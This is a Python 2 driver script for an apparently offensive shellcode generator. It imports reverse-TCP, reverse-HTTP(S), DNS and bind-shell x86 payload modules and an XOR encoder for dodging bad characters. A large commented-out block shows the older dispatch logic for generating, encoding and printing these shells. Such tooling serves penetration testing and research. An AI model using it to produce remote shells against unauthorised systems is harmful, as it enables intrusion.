#!/usr/bin/env python


from common import helpers
from common import orchestra
from encoders import xor
from payloads.x86 import bind_tcp
from payloads.x86 import rev_tcp
from payloads.x86 import rev_tcp_dns
from payloads.x86 import rev_https
from payloads.x86 import rev_http
from payloads.x86 import rev_tcp_all_ports


if __name__ == "__main__":

    # instantiate the orchesta object and call the main conductor
    the_conductor = orchestra.Conductor()

    helpers.cli_parser(
        the_conductor.active_encoders, the_conductor.active_payloads)
    the_conductor.generate()


'''
    #if cli_parsed.payload.lower() == "bind_tcp":

        # Instantiate the bind_tcp payload object
    #    bind_payload = bind_tcp.BindTCP()

        # Set the required attributes, in this case, just the lport
    #    bind_payload.set_attrs(cli_parsed.port)

        # Generate the shellcode
    #    bind_payload.gen_shellcode()

    #    if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
    #        if cli_parsed.encoder.lower() == "xor":
    #            single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
    #            single_xor_encoder.set_shellcode(bind_payload.customized_shellcode)

                # Set the bad characters
    #            single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
    #            single_xor_encoder.do_the_magic()

    #            if cli_parsed.print_stats:
    #                single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                bind_payload.payload_stats(cli_parsed)

            bind_payload.print_shellcode()

    elif cli_parsed.payload.lower() == "rev_tcp":

        # Instantiate the reverse_tcp payload object
        rev_payload = rev_tcp.RevTCP()

        # Set the required attributes (IP and port)
        rev_payload.set_attrs(cli_parsed.port, cli_parsed.ip)

        # Generate the shellcode
        rev_payload.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(rev_payload.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                rev_payload.payload_stats(cli_parsed)

            rev_payload.print_shellcode()

    elif cli_parsed.payload.lower() == "rev_https":

        # Instantiate the reverse_https payload object
        rev_https_payload = rev_https.RevHTTPS()

        # Set the required attributes
        rev_https_payload.set_attrs(cli_parsed.port, cli_parsed.ip)

        # Generate the shellcode
        rev_https_payload.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(rev_https_payload.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                rev_https_payload.payload_stats(cli_parsed)

            rev_https_payload.print_shellcode()

    elif cli_parsed.payload.lower() == "rev_http":

        # Instantiate the reverse http payload object
        rev_http_payload = rev_http.RevHTTP()

        # Set the required attributes
        rev_http_payload.set_attrs(cli_parsed.port, cli_parsed.ip)

        # Generate the shellcode
        rev_http_payload.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(rev_http_payload.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                rev_http_payload.payload_stats(cli_parsed)

            rev_http_payload.print_shellcode()


    elif cli_parsed.payload.lower() == "rev_tcp_dns":

        # Instantiate the reverse tcp dns payload object
        rev_tcp_dns = rev_tcp_dns.RevTCPDNS()

        # Set the required attributes
        rev_tcp_dns.set_attrs(cli_parsed.port, cli_parsed.ip)

        # Generate the shellcode
        rev_tcp_dns.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(rev_tcp_dns.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                rev_tcp_dns.payload_stats(cli_parsed)

            rev_tcp_dns.print_shellcode()

    elif cli_parsed.payload.lower() == "rev_tcp_all_ports":

        # Instantiate the reverse tcp dns payload object
        rev_tcp_ap_payload = rev_tcp_all_ports.RevTCPAP()

        # Set the required attributes
        rev_tcp_ap_payload.set_attrs(cli_parsed.port, cli_parsed.ip)

        # Generate the shellcode
        rev_tcp_ap_payload.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(rev_tcp_ap_payload.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                rev_tcp_ap_payload.payload_stats(cli_parsed)

            rev_tcp_ap_payload.print_shellcode()

    else:
        print "[*] Error: You didn't specify a valid payload to generate!"
        print "[*] Error: Please re-run and select a valid payload!"
        sys.exit()
'''
